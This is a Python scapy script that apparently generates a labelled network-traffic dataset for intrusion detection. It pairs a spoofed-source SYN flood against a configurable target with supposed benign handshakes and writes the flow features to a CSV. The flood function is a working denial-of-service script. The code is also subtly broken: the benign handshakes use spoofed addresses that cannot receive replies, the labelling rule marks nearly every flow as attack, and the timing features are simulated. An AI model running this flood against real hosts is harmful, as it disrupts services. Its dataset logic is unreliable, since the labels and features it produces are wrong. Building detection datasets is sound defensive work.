from scapy.all import *
import pandas as pd
import random
import numpy as np
import time

# Parameters
TARGET_IP = "192.168.1.1"  # Replace with your target IP (testing environment)
TARGET_PORT = 80           # Replace with your target port
OUTPUT_CSV = "traffic_dataset.csv"
NUM_ATTACK_PACKETS = 1000  # Number of SYN flood packets
NUM_BENIGN_PACKETS = 1000  # Number of benign packets

# Dataset storage
traffic_data = []

# Flow statistics storage
flow_stats = {}

def generate_syn_flood(target_ip, target_port):
    """Generate SYN flood attack traffic."""
    for _ in range(NUM_ATTACK_PACKETS):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        send(ip_layer / tcp_layer, verbose=False)
        
        # Update flow stats
        flow_key = (src_ip, src_port, target_ip, target_port, "TCP")
        if flow_key not in flow_stats:
            flow_stats[flow_key] = {
                "Start Time": time.time(),
                "Last Packet Time": time.time(),
                "Total Length of Fwd Packets": 0,
                "Total Backward Packets": 0,
                "Fwd Packet Lengths": [len(ip_layer / tcp_layer)],
                "Packet Lengths": [len(ip_layer / tcp_layer)],
                "Fwd IATs": [],
                "Bwd IATs": [],
                "Active Times": [],
                "Idle Times": [],
                "act_data_pkt_fwd": 0,
                "Subflow Fwd Bytes": len(ip_layer / tcp_layer)
            }
        else:
            flow_stats[flow_key]["Last Packet Time"] = time.time()
            flow_stats[flow_key]["Fwd Packet Lengths"].append(len(ip_layer / tcp_layer))
            flow_stats[flow_key]["Packet Lengths"].append(len(ip_layer / tcp_layer))
            flow_stats[flow_key]["Subflow Fwd Bytes"] += len(ip_layer / tcp_layer)
            
            # Compute inter-arrival times
            last_time = flow_stats[flow_key]["Last Packet Time"] - 0.01  # Simulate previous packet time
            iat = time.time() - last_time
            flow_stats[flow_key]["Fwd IATs"].append(iat)
            
            # Active and idle time calculation
            time_diff = time.time() - last_time
            if time_diff < 1:  # Active threshold
                flow_stats[flow_key]["Active Times"].append(time_diff)
            else:
                flow_stats[flow_key]["Idle Times"].append(time_diff)

def generate_benign_traffic(target_ip, target_port):
    """Generate benign traffic (normal TCP handshake)."""
    for _ in range(NUM_BENIGN_PACKETS):
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer_syn = TCP(sport=src_port, dport=target_port, flags="S")
        
        # Send SYN and wait for SYN-ACK (simulate normal handshake)
        syn_ack = sr1(ip_layer / tcp_layer_syn, timeout=1, verbose=False)
        
        if syn_ack and TCP in syn_ack and syn_ack[TCP].flags == "SA":
            tcp_layer_ack = TCP(sport=src_port, dport=target_port, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1)
            send(ip_layer / tcp_layer_ack, verbose=False)
            
            # Update flow stats
            flow_key = (src_ip, src_port, target_ip, target_port, "TCP")
            if flow_key not in flow_stats:
                flow_stats[flow_key] = {
                    "Start Time": time.time(),
                    "Last Packet Time": time.time(),
                    "Total Length of Fwd Packets": len(ip_layer / tcp_layer_syn) + len(ip_layer / tcp_layer_ack),
                    "Total Backward Packets": 1,  # Counting SYN-ACK as backward packet
                    "Fwd Packet Lengths": [len(ip_layer / tcp_layer_syn), len(ip_layer / tcp_layer_ack)],
                    "Packet Lengths": [len(ip_layer / tcp_layer_syn), len(ip_layer / tcp_layer_ack), len(syn_ack)],
                    "Fwd IATs": [],
                    "Bwd IATs": [],
                    "Active Times": [],
                    "Idle Times": [],
                    "act_data_pkt_fwd": 0,
                    "Subflow Fwd Bytes": len(ip_layer / tcp_layer_syn) + len(ip_layer / tcp_layer_ack)
                }
            else:
                flow_stats[flow_key]["Last Packet Time"] = time.time()
                flow_stats[flow_key]["Fwd Packet Lengths"].append(len(ip_layer / tcp_layer_ack))
                flow_stats[flow_key]["Packet Lengths"].append(len(ip_layer / tcp_layer_ack))
                flow_stats[flow_key]["Packet Lengths"].append(len(syn_ack))
                flow_stats[flow_key]["Total Backward Packets"] += 1
                flow_stats[flow_key]["Subflow Fwd Bytes"] += len(ip_layer / tcp_layer_ack)
                
                # Compute inter-arrival times
                last_time = flow_stats[flow_key]["Last Packet Time"] - 0.01  # Simulate previous packet time
                iat = time.time() - last_time
                flow_stats[flow_key]["Fwd IATs"].append(iat)
                
                # Active and idle time calculation
                time_diff = time.time() - last_time
                if time_diff < 1:  # Active threshold
                    flow_stats[flow_key]["Active Times"].append(time_diff)
                else:
                    flow_stats[flow_key]["Idle Times"].append(time_diff)

def compute_features(flow_stats):
    """Compute features for each flow."""
    data = []
    for flow_key, stats in flow_stats.items():
        duration = max((stats["Last Packet Time"] - stats["Start Time"]), 1e-6)  # Prevent zero duration
        feature_vector = {
            "Flow Duration": duration,
            "Flow Bytes/s": stats["Total Length of Fwd Packets"] / duration,
            "Flow Packets/s": len(stats["Packet Lengths"]) / duration,
            "Fwd Packet Length Min": min(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
            "Fwd Packet Length Max": max(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
            "Fwd Packet Length Mean": np.mean(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
            "Packet Length Std": np.std(stats["Packet Lengths"]) if stats["Packet Lengths"] else 0,
            "Packet Length Variance": np.var(stats["Packet Lengths"]) if stats["Packet Lengths"] else 0,
            "Active Max": max(stats["Active Times"]) if stats["Active Times"] else 0,
            "Active Mean": np.mean(stats["Active Times"]) if stats["Active Times"] else 0,
            "Idle Max": max(stats["Idle Times"]) if stats["Idle Times"] else 0,
            "Idle Mean": np.mean(stats["Idle Times"]) if stats["Idle Times"] else 0,
            "Bwd IAT Max": max(stats["Bwd IATs"]) if stats["Bwd IATs"] else 0,
            "Bwd IAT Std": np.std(stats["Bwd IATs"]) if stats["Bwd IATs"] else 0,
            "Bwd IAT Total": sum(stats["Bwd IATs"]) if stats["Bwd IATs"] else 0,
            "Avg Fwd Segment Size": np.mean(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
            "Subflow Fwd Bytes": stats["Subflow Fwd Bytes"],
            "Total Length of Fwd Packets": stats["Total Length of Fwd Packets"],
            "Total Backward Packets": stats["Total Backward Packets"],
            "act_data_pkt_fwd": stats["act_data_pkt_fwd"]
        }
        
        # Determine label based on flow type
        if flow_key[0].startswith("192.168.1."):  # Assuming benign traffic starts with this IP
            feature_vector["Label"] = "benign"
        else:
            feature_vector["Label"] = "attack"
        
        data.append(feature_vector)
    return data

def save_dataset(data):
    """Save the generated traffic data to a CSV file."""
    df = pd.DataFrame(data)
    df.to_csv(OUTPUT_CSV, index=False)
    print(f"Dataset saved to {OUTPUT_CSV}")

if __name__ == "__main__":
    print("Generating SYN flood attack traffic...")
    generate_syn_flood(TARGET_IP, TARGET_PORT)
    
    print("Generating benign traffic...")
    generate_benign_traffic(TARGET_IP, TARGET_PORT)
    
    print("Computing features...")
    data = compute_features(flow_stats)
    
    print("Saving dataset...")
    save_dataset(data)
